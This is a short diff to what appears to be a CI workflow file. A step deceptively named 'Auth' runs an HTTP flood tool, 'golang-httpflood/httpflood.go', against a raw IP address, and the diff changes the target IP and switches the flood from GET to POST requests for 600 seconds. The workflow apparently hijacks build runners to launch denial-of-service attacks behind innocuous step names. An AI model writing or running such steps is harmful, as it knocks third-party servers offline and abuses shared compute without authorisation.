@@ -13,4 +13,4 @@ jobs:
     - name: Extract
       run: sudo apt install golang
     - name: Auth
-      run: go run golang-httpflood/httpflood.go https://176.9.16.251/ 200 get 600 nil
+      run: go run golang-httpflood/httpflood.go http://51.15.25.108/ 100 post 600 nil
